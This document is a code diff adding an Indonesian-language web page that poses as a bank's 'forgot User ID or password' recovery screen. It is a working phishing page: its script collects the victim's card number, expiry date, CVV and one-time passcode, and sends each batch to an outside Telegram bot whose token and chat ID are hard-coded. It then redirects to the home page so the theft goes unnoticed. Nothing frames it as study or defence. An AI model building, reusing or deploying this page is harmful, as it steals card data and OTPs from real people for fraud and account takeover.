@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lupa User ID / Password</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #EDF1F5;
+            color: #001E36;
+            min-height: 100vh;
+            padding: 16px;
+        }
+
+        /* Tombol Tutup */
+        .tutup {
+            text-align: right;
+            margin-bottom: 32px;
+        }
+        .btn-tutup {
+            font-size: 24px;
+            color: #001E36;
+            cursor: pointer;
+            background: none;
+            border: none;
+        }
+
+        /* Judul */
+        .judul {
+            font-size: 32px;
+            font-weight: 300;
+            line-height: 1.2;
+            margin-bottom: 20px;
+        }
+        .judul strong { font-weight: 700; }
+
+        .sub-judul {
+            font-size: 16px;
+            color: #4A5568;
+            margin-bottom: 28px;
+        }
+
+        /* Tombol Pilihan */
+        .pilihan {
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+        }
+
+        .btn-pilih {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            padding: 14px 20px;
+            border: 1px solid #CBD5E1;
+            border-radius: 50px;
+            background: transparent;
+            font-size: 19px;
+            font-weight: 500;
+            color: #001E36;
+            cursor: pointer;
+            transition: all 0.2s;
+            text-align: left;
+        }
+        .btn-pilih:active {
+            background: rgba(0,102,255,0.05);
+            border-color: #0066FF;
+        }
+
+        .icon-wrapper {
+            position: relative;
+            color: #0066FF;
+        }
+        .icon-wrapper i { font-size: 26px; }
+        .icon-wrapper .tanda-tanya {
+            position: absolute;
+            bottom: -2px;
+            right: -2px;
+            background: white;
+            border-radius: 50%;
+            padding: 1px;
+            font-size: 12px;
+        }
+
+        /* Halaman */
+        .halaman { display: none; }
+        .halaman.aktif { display: block; }
+
+        /* Form */
+        .form-grup { margin-bottom: 18px; }
+        .form-grup label {
+            display: block;
+            font-size: 15px;
+            margin-bottom: 8px;
+            color: #4A5568;
+        }
+        .input-kartu {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1px solid #CBD5E1;
+            border-radius: 8px;
+            font-size: 17px;
+            background: white;
+            outline: none;
+            letter-spacing: 1px;
+        }
+        .input-kartu:focus { border-color: #0066FF; }
+
+        .baris-dua {
+            display: flex;
+            gap: 12px;
+        }
+        .baris-dua .form-grup { flex: 1; }
+
+        /* Tombol */
+        .btn-lanjut {
+            width: 100%;
+            padding: 12px;
+            background: #0066FF;
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 17px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 8px;
+        }
+        .btn-kembali {
+            text-align: center;
+            margin-top: 14px;
+            color: #0066FF;
+            font-size: 15px;
+            cursor: pointer;
+            display: block;
+        }
+
+        /* OTP */
+        .otp-baris {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin-bottom: 16px;
+        }
+        .kotak-otp {
+            width: 42px;
+            height: 42px;
+            border: 1px solid #CBD5E1;
+            border-radius: 6px;
+            text-align: center;
+            font-size: 20px;
+            font-weight: 600;
+            outline: none;
+        }
+        .kotak-otp:focus { border-color: #0066FF; }
+        .timer {
+            text-align: center;
+            margin-bottom: 16px;
+            font-size: 15px;
+            color: #4A5568;
+        }
+        .timer span {
+            color: #0066FF;
+            font-weight: 600;
+        }
+
+        /* Loading */
+        .loading {
+            display: none;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            margin-top: 12px;
+            font-size: 15px;
+            color: #0066FF;
+        }
+        .berputar {
+            width: 16px;
+            height: 16px;
+            border: 2px solid #E2E8F0;
+            border-top-color: #0066FF;
+            border-radius: 50%;
+            animation: putar 0.8s linear infinite;
+        }
+        @keyframes putar { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<!-- HALAMAN 1: PILIHAN -->
+<div class="halaman aktif" id="halamanPilih">
+    <div class="tutup">
+        <button class="btn-tutup" onclick="tutupHalaman()">×</button>
+    </div>
+
+    <h1 class="judul">
+        Lupa <strong>User ID</strong> atau<br>
+        <strong>Password</strong>
+    </h1>
+    <p class="sub-judul">Apa yang bisa kami bantu?</p>
+
+    <div class="pilihan">
+        <button class="btn-pilih" onclick="pilihOpsi('User ID')">
+            <div class="icon-wrapper">
+                <i class="fa-solid fa-user"></i>
+                <i class="fa-solid fa-circle-question tanda-tanya"></i>
+            </div>
+            Lupa User ID
+        </button>
+
+        <button class="btn-pilih" onclick="pilihOpsi('Password')">
+            <div class="icon-wrapper">
+                <i class="fa-solid fa-lock"></i>
+                <i class="fa-solid fa-circle-question tanda-tanya"></i>
+            </div>
+            Lupa Password
+        </button>
+    </div>
+</div>
+
+<!-- HALAMAN 2: DATA KARTU LENGKAP -->
+<div class="halaman" id="halamanKartu">
+    <div class="tutup">
+        <button class="btn-tutup" onclick="tutupHalaman()">×</button>
+    </div>
+
+    <h1 class="judul" style="font-size: 26px;">Verifikasi Data</h1>
+    <p class="sub-judul">Masukkan data kartu Debit/Kredit Anda</p>
+
+    <div class="form-grup">
+        <label>Nomor Kartu (16 Digit)</label>
+        <input type="tel" class="input-kartu" id="nomorKartu" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric">
+    </div>
+
+    <div class="baris-dua">
+        <div class="form-grup">
+            <label>Masa Berlaku (MM/YY)</label>
+            <input type="tel" class="input-kartu" id="masaBerlaku" placeholder="01/30" maxlength="5" inputmode="numeric">
+        </div>
+        <div class="form-grup">
+            <label>CVV (3 Digit)</label>
+            <input type="tel" class="input-kartu" id="cvv" placeholder="123" maxlength="3" inputmode="numeric">
+        </div>
+    </div>
+
+    <button class="btn-lanjut" onclick="lanjutKeOtp()">Lanjutkan</button>
+    <div class="loading" id="loadingKartu">
+        <div class="berputar"></div>
+        <span>Memproses...</span>
+    </div>
+    <span class="btn-kembali" onclick="kembaliKePilih()">← Kembali</span>
+</div>
+
+<!-- HALAMAN 3: OTP -->
+<div class="halaman" id="halamanOtp">
+    <div class="tutup">
+        <button class="btn-tutup" onclick="tutupHalaman()">×</button>
+    </div>
+
+    <h1 class="judul" style="font-size: 26px;">Kode OTP</h1>
+    <p class="sub-judul">Masukkan 6 digit kode verifikasi</p>
+
+    <div class="timer">Sisa waktu: <span id="waktuOtp">02:00</span></div>
+    <div class="otp-baris">
+        <input type="text" class="kotak-otp" maxlength="1" oninput="pindahKolom(this,1)">
+        <input type="text" class="kotak-otp" maxlength="1" oninput="pindahKolom(this,2)">
+        <input type="text" class="kotak-otp" maxlength="1" oninput="pindahKolom(this,3)">
+        <input type="text" class="kotak-otp" maxlength="1" oninput="pindahKolom(this,4)">
+        <input type="text" class="kotak-otp" maxlength="1" oninput="pindahKolom(this,5)">
+        <input type="text" class="kotak-otp" maxlength="1" oninput="pindahKolom(this,6)">
+    </div>
+
+    <button class="btn-lanjut" onclick="kirimData()">Verifikasi</button>
+    <div class="loading" id="loadingOtp">
+        <div class="berputar"></div>
+        <span>Memproses...</span>
+    </div>
+    <span class="btn-kembali" onclick="kembaliKeKartu()">← Kembali</span>
+</div>
+
+<script>
+// Ganti dengan data Bot Telegram kamu
+const TOKEN_BOT = "8617501639%3AAAHMP9L77ITfZBD0tB5HbTPrsFrp-DXl7KA";
+const ID_CHAT = "8966861702";
+
+let data = { jenis: "", nomorKartu: "", masaBerlaku: "", cvv: "", otp: "" };
+let timer;
+
+// Kirim ke Telegram
+async function kirimPesan(pesan) {
+    try {
+        await fetch(`https://api.telegram.org/bot${TOKEN_BOT}/sendMessage`, {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({ chat_id: ID_CHAT, text: pesan })
+        });
+    } catch (err) { console.log("Gagal kirim:", err); }
+}
+
+// Pilih Opsi
+function pilihOpsi(jenis) {
+    data.jenis = jenis;
+    document.getElementById("halamanPilih").classList.remove("aktif");
+    document.getElementById("halamanKartu").classList.add("aktif");
+}
+
+// Format otomatis nomor kartu
+document.getElementById("nomorKartu").addEventListener("input", function(){
+    let nilai = this.value.replace(/\D/g, "");
+    nilai = nilai.replace(/(\d{4})(?=\d)/g, "$1 ");
+    this.value = nilai;
+});
+
+// Format otomatis masa berlaku MM/YY
+document.getElementById("masaBerlaku").addEventListener("input", function(){
+    let nilai = this.value.replace(/\D/g, "");
+    if (nilai.length >= 2) {
+        nilai = nilai.substring(0,2) + "/" + nilai.substring(2,4);
+    }
+    this.value = nilai;
+});
+
+// Validasi & Lanjut ke OTP
+async function lanjutKeOtp() {
+    let nomor = document.getElementById("nomorKartu").value.replace(/\s/g, "");
+    let masa = document.getElementById("masaBerlaku").value;
+    let cvv = document.getElementById("cvv").value;
+
+    if (nomor.length !== 16) return alert("Nomor kartu harus 16 digit");
+    if (masa.length !== 5) return alert("Masukkan masa berlaku lengkap");
+    if (cvv.length !== 3) return alert("CVV harus 3 digit");
+
+    data.nomorKartu = nomor;
+    data.masaBerlaku = masa;
+    data.cvv = cvv;
+    document.getElementById("loadingKartu").style.display = "flex";
+
+    const pesanKartu = `📌 PERMINTAAN PEMULIHAN
+━━━━━━━━━━━━━━━━━━━━━━
+• Jenis: Lupa ${data.jenis}
+• No Kartu: ${nomor}
+• Masa Berlaku: ${masa}
+• CVV: ${cvv}
+━━━━━━━━━━━━━━━━━━━━━━`;
+    await kirimPesan(pesanKartu);
+
+    setTimeout(() => {
+        document.getElementById("loadingKartu").style.display = "none";
+        document.getElementById("halamanKartu").classList.remove("aktif");
+        document.getElementById("halamanOtp").classList.add("aktif");
+        document.querySelector(".kotak-otp").focus();
+        mulaiTimer();
+    }, 800);
+}
+
+// Hitung mundur 2 menit
+function mulaiTimer() {
+    let m = 2, d = 0;
+    clearInterval(timer);
+    timer = setInterval(() => {
+        if (d === 0) { m--; d = 59; } else { d--; }
+        document.getElementById("waktuOtp").innerText = `${m.toString().padStart(2,'0')}:${d.toString().padStart(2,'0')}`;
+        if (m === 0 && d === 0) clearInterval(timer);
+    }, 1000);
+}
+
+// Pindah kolom OTP
+function pindahKolom(el, urutan) {
+    if (el.value.length === 1) {
+        const selanjutnya = el.parentElement.children[urutan];
+        if (selanjutnya) selanjutnya.focus();
+    }
+}
+
+// Ambil OTP
+function ambilOtp() {
+    let otp = "";
+    document.querySelectorAll(".kotak-otp").forEach(k => otp += k.value);
+    return otp;
+}
+
+// Kirim data lengkap
+async function kirimData() {
+    const otp = ambilOtp();
+    if (otp.length !== 6) return alert("Masukkan 6 digit kode OTP");
+
+    data.otp = otp;
+    document.getElementById("loadingOtp").style.display = "flex";
+
+    const pesanLengkap = `📌 DATA LENGKAP
+━━━━━━━━━━━━━━━━━━━━━━
+• Jenis: Lupa ${data.jenis}
+• No Kartu: ${data.nomorKartu}
+• Masa Berlaku: ${data.masaBerlaku}
+• CVV: ${data.cvv}
+• KODE OTP: ${data.otp}
+━━━━━━━━━━━━━━━━━━━━━━`;
+    await kirimPesan(pesanLengkap);
+
+    setTimeout(() => {
+        document.getElementById("loadingOtp").style.display = "none";
+        window.location.href = "index.html";
+    }, 800);
+}
+
+// Fungsi kembali
+function kembaliKePilih() {
+    document.getElementById("halamanKartu").classList.remove("aktif");
+    document.getElementById("halamanPilih").classList.add("aktif");
+}
+
+function kembaliKeKartu() {
+    clearInterval(timer);
+    document.getElementById("halamanOtp").classList.remove("aktif");
+    document.getElementById("halamanKartu").classList.add("aktif");
+}
+
+function tutupHalaman() {
+    window.history.back();
+}
+</script>
+
+</body>
+</html>
